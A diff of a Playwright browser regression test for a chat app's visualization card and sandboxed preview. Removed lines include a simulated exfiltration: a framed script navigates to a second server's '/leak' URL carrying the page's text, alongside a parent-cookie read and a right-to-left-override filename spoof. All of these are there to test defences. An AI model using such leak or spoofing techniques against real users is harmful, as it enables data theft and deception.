@@ -1,48 +1,29 @@
-/** Browser regression with the real Markdown component, file renderer and sandbox policy. */
+/** Browser regression with the real Markdown component: a visualization reference's card in a chat answer. */
 import assert from "node:assert/strict";
-import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
+import { mkdtempSync, mkdirSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { chromium } from "playwright-core";
-import { fileInfo, fileResponse } from "../server/file-view.ts";
 import { chromePath } from "./chrome-path.ts";
 import { CONTENT_SECURITY_POLICY } from "../server/static.ts";
 
 const root = mkdtempSync(join(tmpdir(), "ovis-visualization-qa-"));
+// the card looks nothing up, so the file need not exist: only its path is shown and handed on
 const path = join(root, "before-after.html");
-const directive = `\uE200visualize\uE202${JSON.stringify({ path, mode: "wide", title: "Transmission comparison" })}\uE201`;
-const fragment = `<!doctype html><html><head><style>body{margin:0;padding:16px;background:#123456;color:white;font:15px system-ui}.viz-controls{display:flex;gap:8px;flex-wrap:wrap}.btn{padding:8px;background:transparent;color:inherit;border:1px solid currentColor}.btn[aria-pressed=true]{background:white;color:#123456}.card{padding:16px;border:1px solid currentColor}</style></head><body><div id="diagram"><h2>Before / After</h2><p id="scenario" aria-live="polite">Normal transmission</p>
-<div class="viz-controls"><button class="btn" data-case="normal" aria-pressed="true">Normal</button><button class="btn" data-case="timeout" aria-pressed="false">Timeout</button><button class="btn" data-case="error" aria-pressed="false">Collector error</button></div>
-<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,14em),1fr));gap:1em;margin-top:1em"><div class="card">Before: return without waiting</div><div class="card">After: wait for the flush</div></div></div>
-<script>document.querySelectorAll('[data-case]').forEach(button=>button.onclick=()=>{document.querySelector('#scenario').textContent=button.textContent;document.querySelectorAll('[data-case]').forEach(item=>item.setAttribute('aria-pressed',String(item===button)));document.body.dataset.scenario=button.dataset.case;});</script></body></html>`;
-writeFileSync(path, fragment);
-/** what the fixture PC refuses: the file's lookup, or the frame's own read of the page after a lookup that answered */
-let failing: "stat" | "read" | null = null;
-const stats: URL[] = [];
-const reads: URL[] = [];
+const reference = (data: unknown) => `\uE200visualize\uE202${JSON.stringify(data)}\uE201`;
+const directive = reference({ path, mode: "wide", title: "Transmission comparison" });
 const build = await Bun.build({ entrypoints: ["scripts/chat-visualization-fixture.tsx"], outdir: root, target: "browser", define: { "process.env.NODE_ENV": '"production"' } });
 assert.ok(build.success, String(build.logs));
+/** every request for anything but the fixture's own page: the card must make none */
+const asked: string[] = [];
 const server = Bun.serve({ hostname: "127.0.0.1", port: 0, async fetch(request) {
   const url = new URL(request.url);
-  if (url.pathname === "/api/machines/fixture-pc/fs/stat") {
-    stats.push(url);
-    assert.equal(url.searchParams.get("path"), path);
-    return failing === "stat" ? Response.json({ error: { code: "internal", message: "read failed" } }, { status: 500 }) : Response.json(fileInfo(path));
-  }
-  if (url.pathname === "/api/machines/fixture-pc/fs/file") {
-    reads.push(url);
-    assert.equal(url.searchParams.get("path"), path);
-    if (failing === "read") return Response.json({ error: { code: "internal", message: "read failed" } }, { status: 500 });
-    return fileResponse(fileInfo(path)!, false, url.searchParams.get("render") === "1", null, request);
-  }
   if (url.pathname === "/") return new Response('<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="/chat-visualization-fixture.css"></head><body><div id="root"></div><script type="module" src="/chat-visualization-fixture.js"></script></body></html>', { headers: { "content-security-policy": CONTENT_SECURITY_POLICY, "content-type": "text/html" } });
   if (/^\/chat-visualization-fixture\.(?:js|css)$/.test(url.pathname)) return new Response(Bun.file(join(root, url.pathname.slice(1))));
+  if (url.pathname !== "/favicon.ico") asked.push(`${url.pathname}${url.search}`);
   return new Response("not found", { status: 404 });
 } });
 const origin = `http://127.0.0.1:${server.port}`;
-// another host than the app's, as any site on the web is: a visualization's script must not reach it
-const leaks: string[] = [];
-const elsewhere = Bun.serve({ hostname: "localhost", port: 0, fetch(request) { leaks.push(request.url); return new Response("collected"); } });
 if (process.argv.includes("--serve")) {
   console.log(JSON.stringify({ origin, path, directive }));
   await new Promise(() => {});
@@ -58,93 +39,44 @@ try {
   await page.goto(origin);
   await page.waitForFunction(() => !!window.visualizationQa);
   await page.evaluate((text) => window.visualizationQa.update(`Intro\n${text}\nConclusion`), directive);
-  // a reference alone looks nothing up and runs nothing: the answer draws a card that names the file
-  const answer = page.locator("#answer");
-  const preview = answer.getByRole("button", { name: "Show preview", exact: true });
+  // in an answer the reference is a card: the file's own name, the reference's title under it, and one button
+  const answer = page.locator("#answer"), card = answer.locator(".markdown-visualization");
+  const preview = card.getByRole("button", { name: "Open preview", exact: true });
   await preview.waitFor();
-  assert.equal(await page.locator("iframe").count(), 0, "no frame before the person asks");
-  assert.equal(stats.length + reads.length, 0, "and no lookup or read of the file");
+  assert.equal(await card.locator(".markdown-visualization-name").innerText(), "before-after.html");
+  assert.equal(await card.locator(".markdown-visualization-title").innerText(), "Transmission comparison");
+  assert.equal(await card.getByRole("button").count(), 1);
+  assert.ok(!await answer.innerText().then((text) => text.includes("\uE200visualize")), "the reference's own text is not shown in an answer");
   // any other Markdown keeps the reference as the text it is
   assert.equal(await page.locator("#elsewhere .markdown-visualization").count(), 0);
   assert.ok(await page.locator("#elsewhere").innerText().then((text) => text.includes("visualize") && text.includes("before-after.html")), "the reference stays text outside an answer");
-  await preview.click();
-  const frame = page.frameLocator("iframe.markdown-visualization-frame");
-  await frame.getByRole("button", { name: "Timeout", exact: true }).click();
-  await frame.getByText("Timeout", { exact: true }).first().waitFor();
-  assert.equal(await frame.locator("#scenario").textContent(), "Timeout");
-  assert.equal(await frame.locator('[data-case="timeout"]').getAttribute("aria-pressed"), "true");
-  assert.equal(reads[0]!.searchParams.get("render"), "1");
-  assert.equal(reads[0]!.searchParams.has("visualize"), false);
-  assert.ok(!await answer.innerText().then((text) => text.includes("\uE200visualize")));
-  assert.equal(await frame.locator("body").evaluate(() => { try { return parent.document.cookie; } catch { return "blocked"; } }), "blocked");
-  await page.waitForFunction(() => !document.querySelector('[role="status"]'));
-  const ownBackground = await frame.locator("body").evaluate((body) => getComputedStyle(body).backgroundColor);
-  assert.equal(ownBackground, "rgb(18, 52, 86)", "the document keeps its own styles");
-  await page.evaluate(() => document.documentElement.style.setProperty("--bg", "rgb(200, 100, 50)"));
-  assert.equal(await frame.locator("body").evaluate((body) => getComputedStyle(body).backgroundColor), ownBackground);
-  assert.equal(await frame.locator("body").evaluate(() => typeof (window as unknown as { openai?: unknown }).openai), "undefined", "no host API is invented");
-  const initialHeight = (await page.locator("iframe").boundingBox())!.height;
-  await page.evaluate(() => window.postMessage({ type: "ovis-visualization-size", height: 999999 }, "*"));
-  assert.equal((await page.locator("iframe").boundingBox())!.height, initialHeight, "unrelated windows cannot resize the preview");
   mkdirSync(".ci/visualization", { recursive: true });
   await page.screenshot({ path: ".ci/visualization/desktop.png" });
-  await page.setViewportSize({ width: 390, height: 844 });
-  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth > innerWidth), false);
-  assert.equal(await frame.locator("html").evaluate((html) => html.scrollWidth > innerWidth), false);
-  await frame.getByRole("button", { name: "Collector error", exact: true }).click();
-  assert.equal(await frame.locator("#scenario").textContent(), "Collector error");
-  await page.screenshot({ path: ".ci/visualization/mobile.png" });
-  await page.getByRole("button", { name: "Transmission comparison", exact: true }).click();
+  // a press opens the file viewer on exactly that path; the card itself draws no frame and asks the PC for nothing
+  await preview.click();
   assert.deepEqual(await page.evaluate(() => window.visualizationQa.opened), [path]);
-  // a reload asks again, and a lookup the PC fails says so with Retry
-  failing = "stat";
-  await page.reload();
-  await page.waitForFunction(() => !!window.visualizationQa);
-  await page.evaluate((text) => window.visualizationQa.update(text), directive);
-  await preview.click();
-  await page.getByRole("alert").waitFor();
-  assert.match(await page.getByRole("alert").innerText(), /The PC could not read the file/);
-  const before = stats.length;
-  await page.evaluate((text) => window.visualizationQa.update(`Extra prose\n${text}`), directive);
-  assert.equal(stats.length, before, "ordinary transcript updates do not loop failed file requests");
-  failing = null;
-  await page.getByRole("button", { name: "Retry", exact: true }).click();
-  await page.frameLocator("iframe").getByRole("button", { name: "Normal", exact: true }).waitFor();
-  assert.equal(stats.length, before + 1);
-  // the frame's own read refused after a lookup that answered: told with Retry, not left as the refusal in the frame
-  failing = "read";
-  await page.reload();
-  await page.waitForFunction(() => !!window.visualizationQa);
-  await page.evaluate((text) => window.visualizationQa.update(text), directive);
-  await preview.click();
-  await page.getByRole("alert").waitFor();
-  assert.match(await page.getByRole("alert").innerText(), /The PC could not read the file/);
-  assert.equal(await page.locator("iframe").count(), 0, "the refused frame is gone");
-  failing = null;
-  await page.getByRole("button", { name: "Retry", exact: true }).click();
-  await page.frameLocator("iframe").getByRole("button", { name: "Normal", exact: true }).waitFor();
+  assert.equal(await page.locator("iframe").count(), 0, "the card draws no frame");
+  // a name with a right-to-left override, and a title that pretends to be another file: the name shown is the file's own
+  await page.evaluate((text) => window.visualizationQa.update(text), reference({ path: join(root, "report\u202Efdp.html"), title: "\u202Einvoice.pdf" }));
+  await page.waitForFunction(() => document.querySelector("#answer .markdown-visualization-name")?.textContent === "reportfdp.html");
+  assert.equal(await card.locator(".markdown-visualization-title").innerText(), "invoice.pdf");
   // a reference indented under an ordered list's item is drawn in that item, and the list goes on as one
   await page.evaluate((text) => window.visualizationQa.update(`1. First\n   ${text}\n1. Second`), directive);
   const items = answer.locator("ol > li");
-  await items.first().frameLocator("iframe.markdown-visualization-frame").getByRole("button", { name: "Normal", exact: true }).waitFor();
-  assert.equal(await items.count(), 2, "the visualization does not end its list");
+  await items.first().locator(".markdown-visualization").getByRole("button", { name: "Open preview", exact: true }).waitFor();
+  assert.equal(await items.count(), 2, "the card does not end its list");
   assert.equal(await answer.locator("ol").count(), 1);
-  assert.ok(!await answer.innerText().then((text) => text.includes("\uE200visualize")));
-  // the document's script holds what the Page renderer put into it; it cannot send it to another host by moving its own
-  // frame there (the app's frame-src), and the sandbox and the page's policy allow it no other request
-  await page.evaluate(() => addEventListener("securitypolicyviolation", (event) => { (window as unknown as { refused?: string[] }).refused = [event.effectiveDirective, event.blockedURI]; }, { once: true }));
-  const away = `http://localhost:${elsewhere.port}`;
-  await items.first().frameLocator("iframe.markdown-visualization-frame").locator("body").evaluate((_, to) => { setTimeout(() => { location.href = `${to}/leak?d=${encodeURIComponent(document.body.innerText)}`; }, 0); }, away);
-  await page.waitForFunction(() => (window as unknown as { refused?: string[] }).refused !== undefined);
-  const refused = await page.evaluate(() => (window as unknown as { refused: string[] }).refused);
-  assert.equal(refused[0], "frame-src", "the app refuses to frame another host");
-  assert.ok(refused[1]!.startsWith(away), refused[1]);
-  assert.deepEqual(leaks, [], "nothing reached the other host");
+  // a phone's width: the card and its button stay inside the page
+  await page.setViewportSize({ width: 390, height: 844 });
+  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth > innerWidth), false);
+  const edge = (await items.first().locator(".markdown-visualization .btn").boundingBox())!;
+  assert.ok(edge.x >= 0 && edge.x + edge.width <= 390, JSON.stringify(edge));
+  await page.screenshot({ path: ".ci/visualization/mobile.png" });
+  assert.deepEqual(asked, [], "no lookup or read of the file, before or after the press");
   assert.deepEqual(errors, []);
-  console.log("PASS nothing runs before Show preview, text outside an answer, original HTML/styles/controls preserved, no theme or host API injection, sandbox, no navigation to another host, PC ownership, 390px reflow, a reference in a list item, file opener, and Retry after a failed lookup and a refused page read");
+  console.log("PASS a reference in an answer is a card with the file's own name and Open preview; it asks the PC for nothing and draws no frame, opens the viewer on its path, stays text elsewhere, sits in its list item, and fits a phone");
 } finally {
   await browser?.close();
   server.stop(true);
-  elsewhere.stop(true);
   rmSync(root, { recursive: true, force: true });
 }
